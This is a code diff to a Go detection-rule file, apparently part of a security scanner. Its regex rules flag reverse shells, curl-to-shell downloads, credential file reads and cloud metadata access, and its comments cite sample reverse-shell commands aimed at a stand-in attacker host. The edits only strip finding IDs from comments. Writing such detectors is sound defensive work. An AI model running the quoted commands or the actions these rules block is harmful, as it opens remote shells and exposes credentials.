@@ -92,19 +92,19 @@ var secretRules = []PatternRule{
 var commandRules = []PatternRule{
 	// Reverse shells and bind shells
 	{ID: "CMD-REVSHELL-BASH", Pattern: regexp.MustCompile(`(?i)bash\s+-i\s+>&\s*/dev/tcp/`), Title: "Bash reverse shell", Severity: "CRITICAL", Confidence: 0.98, Tags: []string{"execution", "reverse-shell"}},
-	// Closes avarice F-1729: bash /dev/tcp also accepts hostnames
+	// Closes bash /dev/tcp also accepts hostnames
 	// (e.g. exec 5<>/dev/tcp/attacker.example/4444). Match either a
 	// dotted-quad IPv4 prefix OR a non-empty hostname-shaped token
 	// followed by `/<port>`. Hostname branch demands at least one
 	// `.` to limit FPs against benign /dev/tcp/<service> fragments.
 	{ID: "CMD-REVSHELL-DEVTCP", Pattern: regexp.MustCompile(`/dev/tcp/(?:\d{1,3}\.\d{1,3}|[A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)+)/\d+\b`), Title: "Reverse shell via /dev/tcp", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"execution", "reverse-shell"}},
-	// Closes avarice F-1728: matches BOTH `-e`/`--exec` orderings:
+	// Closes matches BOTH `-e`/`--exec` orderings:
 	//   destination-first:  nc 1.2.3.4 4444 -e /bin/sh
 	//   flag-first:         nc -e /bin/sh 1.2.3.4 4444
 	{ID: "CMD-REVSHELL-NC", Pattern: regexp.MustCompile(`(?i)\b(?:nc|ncat|netcat)\b\s+(?:(?:-[a-zA-Z]*\s+)*\S+\s+\d+\s*(?:-e|--exec)\b|(?:-[a-zA-Z]*\s+)*(?:-e|--exec)\s+\S+\s+\S+\s+\d+\b)`), Title: "Netcat reverse shell with -e", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"execution", "reverse-shell"}},
 	{ID: "CMD-REVSHELL-PYTHON", Pattern: regexp.MustCompile(`(?i)python[23]?\s+-c\s+.*socket.*connect`), Title: "Python reverse shell", Severity: "CRITICAL", Confidence: 0.90, Tags: []string{"execution", "reverse-shell"}},
 	// Piped execution — download and run
-	// Closes avarice F-1767: also match absolute shell paths like
+	// Closes also match absolute shell paths like
 	// `/bin/sh`, `/bin/bash`, `/usr/bin/zsh`, plus the bare
 	// `sh`/`bash`/`zsh` forms. Mirrors policies/guardrail/{default,strict}/rules/commands.yaml.
 	{ID: "CMD-PIPE-CURL", Pattern: regexp.MustCompile(`(?i)\bcurl\b\s+[^|]*\|\s*(?:[/\w]+/)?(?:bash|zsh|sh)\b`), Title: "curl piped to shell", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"execution", "download-exec"}},
@@ -144,7 +144,7 @@ var commandRules = []PatternRule{
 // matching ".env").
 // ---------------------------------------------------------------------------
 
-// Closes avarice F-1726: every credential-file rule below uses the
+// Closes every credential-file rule below uses the
 // home-prefix sub-pattern `(?:~|\$\{?HOME\}?|/home/\w+|/root)`, which
 // matches the braced shell form `${HOME}/.aws/credentials` in
 // addition to `~`, `$HOME`, `/home/<user>`, and `/root`. Without the
@@ -164,7 +164,7 @@ var sensitivePathRules = []PatternRule{
 	{ID: "PATH-PYPIRC", Pattern: regexp.MustCompile(`(?:~|\$\{?HOME\}?|/home/\w+|/root)/\.pypirc`), Title: "PyPI config (may contain tokens)", Severity: "MEDIUM", Confidence: 0.80, Tags: []string{"credential", "file-sensitive"}},
 	{ID: "PATH-GIT-CREDS", Pattern: regexp.MustCompile(`(?:~|\$\{?HOME\}?|/home/\w+|/root)/\.git-credentials`), Title: "Git credentials file", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"credential", "file-sensitive"}},
 	{ID: "PATH-NETRC", Pattern: regexp.MustCompile(`(?:~|\$\{?HOME\}?|/home/\w+|/root)/\.netrc`), Title: "netrc credentials file", Severity: "CRITICAL", Confidence: 0.90, Tags: []string{"credential", "file-sensitive"}},
-	// Closes avarice F-1727: `;` (shell command separator) added to
+	// Closes `;` (shell command separator) added to
 	// the suffix delimiter classes so `cat .env; true` also matches.
 	{ID: "PATH-ENV-FILE", Pattern: regexp.MustCompile(`(?:^|[\s/])\.env(?:\.(?:local|production|staging|development))?\s*["'\s,;\]})]*$|(?:^|[\s/])\.env(?:\.(?:local|production|staging|development))?["'\s,;\]})]`), Title: "Environment file", Severity: "HIGH", Confidence: 0.85, Tags: []string{"credential", "file-sensitive"}},
 	// The /etc/{passwd,shadow,sudoers} rules tolerate common obfuscations:
@@ -203,7 +203,7 @@ var c2Rules = []PatternRule{
 	{ID: "C2-PASTEBIN", Pattern: regexp.MustCompile(`(?i)pastebin\.com/raw/`), Title: "Pastebin raw fetch", Severity: "MEDIUM", Confidence: 0.70, Tags: []string{"exfiltration", "c2"}},
 	// Cloud metadata endpoints (SSRF)
 	{ID: "C2-METADATA-AWS", Pattern: regexp.MustCompile(`169\.254\.169\.254`), Title: "AWS metadata endpoint (SSRF)", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"ssrf", "credential"}},
-	// Closes avarice F-1725: case-insensitive so uppercase DNS host
+	// Closes case-insensitive so uppercase DNS host
 	// variants (METADATA.GOOGLE.INTERNAL) cannot bypass the rule.
 	{ID: "C2-METADATA-GCP", Pattern: regexp.MustCompile(`(?i)metadata\.google\.internal`), Title: "GCP metadata endpoint (SSRF)", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"ssrf", "credential"}},
 	{ID: "C2-METADATA-AZURE", Pattern: regexp.MustCompile(`169\.254\.169\.254/metadata`), Title: "Azure metadata endpoint (SSRF)", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"ssrf", "credential"}},
